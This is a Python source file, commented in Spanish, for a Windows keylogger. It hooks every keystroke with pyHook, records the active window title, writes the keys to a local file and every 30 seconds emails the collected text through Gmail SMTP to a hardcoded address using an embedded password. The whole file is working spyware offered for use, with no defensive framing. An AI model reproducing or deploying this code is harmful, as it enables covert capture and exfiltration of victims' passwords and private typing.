import pyHook, pythoncom, logging, time, datetime, ctypes

# Crear una carpeta y poner la ubicacion del documento aqui
carpeta_destino = 'C:\\keylogger\\Key.txt'
segundos_espera = 30
timeout = time.time() + segundos_espera
letras_tecleadas = []  # Lista para almacenar las letras
current_window = None  # Variable to store the current active window

def TimeOut():
    return time.time() > timeout 
    
def EnviarEmail():
    global letras_tecleadas, current_window  # Accede a las variables globales
    with open(carpeta_destino, 'r+') as f:
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read()
        
        if letras_tecleadas:
            # Procesar las letras almacenadas en la lista
            data = ''.join(letras_tecleadas)
            data = data.replace('space', ' ')
            data = data.replace('SPACE', ' ')
            data = data.replace('capital', '')
            data = data.replace('CAPITAL', '')
            data = data.replace('return', '\n')
            data = data.replace('RETURN', '\n')
            data = data.replace('back', '')
            data = data.replace('BACK', '')
            data = data.replace('oem_period', '.')
            data = data.replace('OEM_PERIOD', '.')
            data = data.replace('oem_comma', ',')
            data = data.replace('OEM_COMMA', ',')
            data = data.replace('oem_2', '/')
            data = data.replace('oem_5', '\\')
            data = data.replace('lcontrol', '')
            data = data.replace('lshift\n2', '@')
            data = data.replace('lshift', '')
            data = data.replace('\n', '')

            data = f'Mensaje capturado a las: {fecha}\nUltima Ventana: {current_window}\n{data}'
            print(data)
            
            # Aqui va el gmail al que deses que se envie la informacion
            crearEmail('loggerk297@gmail.com', 'izco oikh rppr rmnq', 'loggerk297@gmail.com', fecha, data)
            letras_tecleadas = []  # Limpiar la lista después de enviar el correo
            f.seek(0)
            f.truncate()
        else:
            print("No se ha tecleado nada. No se enviará el correo.")

        
def crearEmail(user, passw, recep, subj, body):
    import smtplib
    mailUser = user
    mailPass = passw
    From = user
    To = recep
    Subject = subj
    Txt = body
    
    email = """\From: %s\nTo: %snSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)
    
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)
        server.close()
        print('Correo enviado con exito')
        
    except:
        print('ERROR: Correo fallido.')
        
def get_caps_lock_state():
    return ctypes.windll.user32.GetKeyState(0x14) & 1 != 0

def OnKeyboardEvent(event):
    global letras_tecleadas, current_window  # Accede a las variables globales
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
    
    # Verificar si la ventana actual es diferente a la almacenada
    if event.WindowName != current_window:
        current_window = event.WindowName
        print('WindowName:', current_window)
    
    # Verificar si la tecla está en mayúsculas
    is_caps_lock = get_caps_lock_state()
    key = event.Key.lower() if not is_caps_lock else event.Key.upper()
    
    print('Key:', key)
    logging.log(10, key)
    
    if key == 'back' or key == 'BACK':
        # Si la tecla es 'delete', eliminar la última letra de la lista
        if letras_tecleadas:
            letras_tecleadas.pop()
    else:
        letras_tecleadas.append(key)
    
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if TimeOut():
        EnviarEmail()
        timeout = time.time() + segundos_espera
        
        
    pythoncom.PumpWaitingMessages()